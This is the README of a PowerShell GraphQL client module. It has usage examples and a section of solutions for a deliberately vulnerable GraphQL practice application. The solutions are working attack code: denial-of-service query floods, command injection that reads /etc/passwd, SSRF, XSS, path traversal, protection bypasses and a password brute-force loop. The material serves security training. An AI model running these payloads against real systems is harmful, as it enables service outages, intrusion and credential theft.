# PSGraphQL
This PowerShell module contains functions that facilitate query and mutation operations against GraphQL endpoints.

### Tested on
:desktop_computer: `Windows 10/11`
:penguin: `Linux`
:apple: `MacOS`

### Requirements
Requires PowerShell 5.1 or above.

### Installation

```powershell
Install-Module -Name PSGraphQL -Repository PSGallery -Scope CurrentUser
```

## Examples

### Send a GraphQL query to an endpoint including operation name and variables
```powershell

$uri = "https://mytargetserver/v1/graphql"

$query = '
    query RollDice($dice: Int!, $sides: Int!) {
        rollDice(numDice: $dice, numSides: $sides)
}'

$opName = "RollDice"

$variables = '
    {
        "dice": 3,
        "sides": 6
    }'

Invoke-GraphQLQuery -Query $query -OperationName $opName -Variables $variables -Uri $uri       
```

### Send a GraphQL query to an endpoint including operation name and variables as a HashTable
```powershell

$uri = "https://mytargetserver/v1/graphql"

$query = '
    query RollDice($dice: Int!, $sides: Int!) {
        rollDice(numDice: $dice, numSides: $sides)
}'

$opName = "RollDice"
$variables = @{dice=3; sides=6}

Invoke-GraphQLQuery -Query $query -OperationName $opName -Variables $variables -Uri $uri       
```

### Send a GraphQL introspection query to an endpoint with the results returned as JSON

```powershell
$uri = "https://mytargetserver/v1/graphql"

$introspectionQuery = '
    query allSchemaTypes {
        __schema {
            types {
                name
                kind
                description
            }
        }
    }
'

Invoke-GraphQLQuery -Query $introspectionQuery -Uri $uri -Raw
```

### Send a GraphQL query to an endpoint with the results returned as objects

```powershell
$uri = "https://mytargetserver/v1/graphql"

$myQuery = '
    query {
        users {
            created_at
            id
            last_seen
            name
        }
    }
'

Invoke-GraphQLQuery -Query $myQuery -Uri $uri
```

### Send a GraphQL mutation to an endpoint with the results returned as JSON

```powershell
$uri = "https://mytargetserver/v1/graphql"

$myMutation = '
    mutation MyMutation {
        insert_users_one(object: {id: "57", name: "FirstName LastName"}) {
        id
    }
}
'

$requestHeaders = @{ "x-api-key"='aoMGY{+93dx&t!5)VMu4pI8U8T.ULO' }

$jsonResult = Invoke-GraphQLQuery -Mutation $myMutation -Headers $requestHeaders -Uri $uri -Raw
```

### Send a GraphQL query using JWT for authentication to an endpoint and navigate the results

```powershell
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MjAzOTMwMjgsIm5iZiI6MTYyMDM5MzAyNywiZXhwIjoxNjIwMzkzMzI4LCJzdWIiOiJtZUBjb21wYW55LmNvbSIsImp0aSI6ImMwZTk0ZTY0ODc4ZjRlZDFhZWM3YWYwYzViOWM2ZWI5Iiwicm9sZSI6InVzZXIifQ.HaTXDunEjmyUsHs7daLe-AxEpmq58QqqFziydm7MBic"

$headers = @{Authorization="Bearer $jwt"}

$uri = "https://mytargetserver/v1/graphql"

$myQuery = '
    query GetUsers {
        users {
            created_at
            id
            last_seen
            name
    }
}
'

$result = Invoke-GraphQLQuery -Query $myQuery -Headers $headers -Uri $uri
$result.data.users | Format-Table
```

### Send a GraphQL query to an endpoint with the results returned as JSON (as a one-liner using aliases)

```powershell
gql -q 'query { users { created_at id last_seen name } }' -u 'https://mytargetserver/v1/graphql' -r
```

### Get a list of variable definitions from a GraphQL query
```powershell
$query = '
    query RollDice($dice: Int!, $sides: Int) {
        rollDice(numDice: $dice, numSides: $sides)
}'

Get-GraphQLVariableList -Query $query
```

### Perform parameter fuzzing against a GraphQL endpoint based on discovered parameters (security testing)
```powershell
$mutation = '
    mutation AddNewPet ($name: String!, $petType: PetType, $petLocation: String!, $petId: Int!) {
            addPet(name: $name, petType: $petType, location: $petLocation, id: $petId) {
            name
            petType
            location
            id
        }
    }'

$wordListPath = ".\SQL.txt"
$words = [IO.File]::ReadAllLines($wordListPath)

$uri = "https://mytargetserver/v1/graphql"

# Array to store results from Invoke-GraphQLQuery -Detailed for later analysis:
$results = @()

# Get the variable definition from the supplied mutation:
$variableList = $mutation | Get-GraphQLVariableList

$words | ForEach-Object {
    $queryVarTable = @{}
    $word = $_

    $variableList | Select Parameter, Type | ForEach-Object {
        $randomInt = Get-Random       
        if ($_.Type -eq "Int") {
            if (-not($queryVarTable.ContainsKey($_.Parameter))) {
                $queryVarTable.Add($_.Parameter, $randomInt)               
            }
        }
        else {
            if (-not($queryVarTable.ContainsKey($_.Parameter))) {
                $queryVarTable.Add($_.Parameter, $word)                
            }
        }
    }

    $gqlResult = Invoke-GraphQLQuery -Mutation $mutation -Variables $queryVarTable -Headers $headers -Uri $uri -Detailed    
    $result = [PSCustomObject]@{ParamValues = ($queryVarTable); Result = ($gqlResult) }    
    $results += $result
}
```

# Damn Vulnerable GraphQL Application Solutions

The "Damn Vulnerable GraphQL Application" is an intentionally vulnerable implementation of the GraphQL technology that allows a tester to learn and practice GraphQL security. For more on DVGQL, please see: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application

The solutions below are written in PowerShell exclusively but one of the solutions required Invoke-WebRequest as opposed to Invoke-GraphQLQuery.

```powershell
# GraphQL endpoint for all solutions below:
$gqlEndpointUri = "https://mygraphqlserver.company.com/graphql"
```  
  
  
## Denial of Service :: Batch Query Attack

```powershell
# Specify amount of queries to generate:
$amountOfQueries = 100

# Base query:
$sysUpdateQuery = '
query {
    systemUpdate
}
'

# For 1 to $amountOfQueries, concatenate $sysUpdateQuery and assign to $batchQueryAttackPayload:
$batchQueryAttackPayload = ((1..$amountOfQueries | ForEach-Object { $sysUpdateQuery }).Trim()) -join "`r`n"

# Send batch attack to GraphQL endpoint:
Invoke-GraphQLQuery -Uri $gqlEndpointUri -Query $batchQueryAttackPayload
```

## Denial of Service :: Deep Recursion Query Attack
```powershell

$depthAttackQuery = '
query {
      pastes {
        owner {
          paste {
            edges {
              node {
                  owner {
                    paste {
                      edges {
                        node {
                          owner {
                            paste {
                              edges {
                                node {
                                  owner {
                                    id
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
'

Invoke-GraphQLQuery -Query $depthAttackQuery -Uri $gqlEndpointUri -Raw
```


## Denial of Service :: Resource Intensive Query Attack
```powershell
$timingTestPayload = '
    query TimingTest {
      systemUpdate
    }
'

$start = Get-Date

Invoke-GraphQLQuery -Query $timingTestPayload -Uri $gqlEndpointUri -Raw

$end = Get-Date

$delta = $end - $start
$totalSeconds = $delta.Seconds
$message = "Total seconds to execute query: {0}" -f $totalSeconds

Write-Host -Object $message -ForegroundColor Cyan
```

## Information Disclosure :: GraphQL Introspection
```powershell
$introspectionQuery = '
  query {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
      }
    }
'

Invoke-GraphQLQuery -Query $introspectionQuery -Uri $gqlEndpointUri -Raw
```


## Information Disclosure :: GraphQL Interface
```powershell

$graphiqlUri = "{0}/graphiql" -f $targetUri

$headers = @{Accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"}

Invoke-WebRequest -Uri $graphiqlUri -Headers $headers -Method Get -UseBasicParsing | Select -ExpandProperty Content
```


## Information Disclosure :: GraphQL Field Suggestions
```powershell
$fieldSuggestionsQuery = '
    query {
        systemUpdate
    }
'

Invoke-GraphQLQuery -Query $fieldSuggestionsQuery -Uri $gqlEndpointUri -Raw
```


## Information Disclosure :: Server Side Request Forgery
```powershell
$requestForgeryMutation = '
mutation {
    importPaste(host:"localhost", port:57130, path:"/", scheme:"http") {
      result
    }
}
'

Invoke-GraphQLQuery -Mutation $requestForgeryMutation -Uri $gqlEndpointUri -Raw
```


## Code Execution :: OS Command Injection #1
```powershell
$commandToInject = "ls -al"

$commandInjectionMutation = '
  mutation  {
    importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
      result
    }
  }
'

$response = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri

$result = $response.data.importPaste.result

Write-Host -Object $result -ForegroundColor Magenta
```


## Code Execution :: OS Command Injection #2
```powershell
# Admin creds for DVGQL:
$userName = "admin"
$password = "password"

$commandToInject = "ls -alr"

$commandInjectionQuery = '
    query {
        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"id; ' + $commandToInject + '")
    }
'

Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
```

## Code Execution :: OS Command Injection #3
```powershell
# Admin creds for DVGQL:
$userName = "admin"
$password = "password"

$commandToInject = "cat /etc/passwd"

$commandInjectionQuery = '
    query {
        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"' + $commandToInject + '")
    }
'

Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
```

## Code Execution :: OS Command Injection #4
```powershell
# Credit Zachary Asher for this one!
# This is abstracting "cat /etc/passwd via the following:
# 1. Change directory via "cd" repeatedly to get to the root directory
# 2. Change director to the etc directory...
# 3. ...and finally execute "cat" (concatenate) to read the contents of the passwd file:
$commandToInject = "cd .. && cd .. && cd .. && cd etc && cat passwd"

$commandInjectionMutation = '
mutation  {
      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
        result
      }
    }
'

$response = $null
try {
    $response = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri -ErrorAction Stop
    $result = $response.data.importPaste.result
    Write-Host -Object $result -ForegroundColor Magenta
}
catch
{
    Write-Host -Object $_.Exception -ForegroundColor Red
}
```

## Code Execution :: OS Command Injection #5
```powershell
# Find all conf files:
$commandToInject = "find / -type f -name '*.conf' 2>/dev/null"

$commandInjectionMutation = '
mutation  {
      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
        result
      }
    }
'

$response = $null
try {
    $response = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri -ErrorAction Stop
    $result = $response.data.importPaste.result
    Write-Host -Object $result -ForegroundColor Magenta
}
catch
{
    Write-Host -Object $_.Exception -ForegroundColor Red
}
```



## Injection :: Stored Cross Site Scripting
```powershell
$xssInjectionMutation = '
    mutation XcssMutation {
        uploadPaste(content: "<script>alert(1)</script>", filename: "C:\\temp\\file.txt") {
            content
            filename
            result
        }
    }
'

Invoke-GraphQLQuery -Mutation $xssInjectionMutation -Uri $gqlEndpointUri -Raw
```


## Injection :: Log Injection
```powershell
$logInjectionMutation = '
    mutation getPaste{
        createPaste(title:"<script>alert(1)</script>", content:"zzzz", public:true) {
                burn
                content
                public
                title
            }
    }
'

Invoke-GraphQLQuery -Mutation $logInjectionMutation -Uri $gqlEndpointUri
```


## Injection :: HTML Injection
```powershell
$htmlInjectionMutation = '
    mutation myHtmlInjectionMutation {
        createPaste(title:"<h1>hello!</h1>", content:"zzzz", public:true) {
            burn
            content
            public
            title
        }
    }
'

Invoke-GraphQLQuery -Mutation $htmlInjectionMutation -Uri $gqlEndpointUri -Raw
```


## Authorization Bypass :: GraphQL Interface Protection Bypass
```powershell
$reconQuery = '
   query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
  }
}
'

$session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$cookie = [System.Net.Cookie]::new()
$cookie.Name = "env"
# $cookie.Value = "Z3JhcGhpcWw6ZGlzYWJsZQ" # This is base64 for graphiql:disable
$cookie.Value = "Z3JhcGhpcWw6ZW5hYmxl" # This is base64 for graphiql:enable
$domain = [Uri]::new($gqlEndpointUri).Host
$cookie.Domain = $domain
$session.Cookies.Add($cookie)

Invoke-GraphQLQuery -Query $reconQuery -Uri $gqlEndpointUri -WebSession $session -Raw
```


## GraphQL Query Deny List Bypass
```powershell
$bypassQuery = '
    query BypassMe {
      systemHealth
    }
'

$headers= @{'X-DVGA-MODE'='Expert'}

Invoke-GraphQLQuery -Query $bypassQuery -Uri $gqlEndpointUri -Headers $headers -Raw
```


## Miscellaneous :: Arbitrary File Write // Path Traversal
```powershell
$pathTraversalMutation = '
    mutation PathTraversalMutation {
            uploadPaste(filename:"../../../../../tmp/file.txt", content:"path traversal test successful"){
            result
        }
    }
'

Invoke-GraphQLQuery -Mutation $pathTraversalMutation -Uri $gqlEndpointUri -Raw
```


## Miscellaneous :: GraphQL Query Weak Password Protection
```powershell
$passwordList = @('admin123', 'pass123', 'adminadmin', '123', 'password', 'changeme', 'password54321', 'letmein', 'admin123', 'iloveyou', '00000000')

$command = "ls"

foreach ($pw in $passwordList)
{
    $bruteForceAuthQuery = '
        query bruteForceQuery {
          systemDiagnostics(username: "admin", password: "' + $pw + '", cmd: "' + $command + '")
        }
    '

    $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri

    if ($result.data.systemDiagnostics -ne "Password Incorrect") {
        Write-Host -Object $("The password is: ") -ForegroundColor Yellow -NoNewline
        Write-Host -Object $pw -ForegroundColor Green
    }
}
```
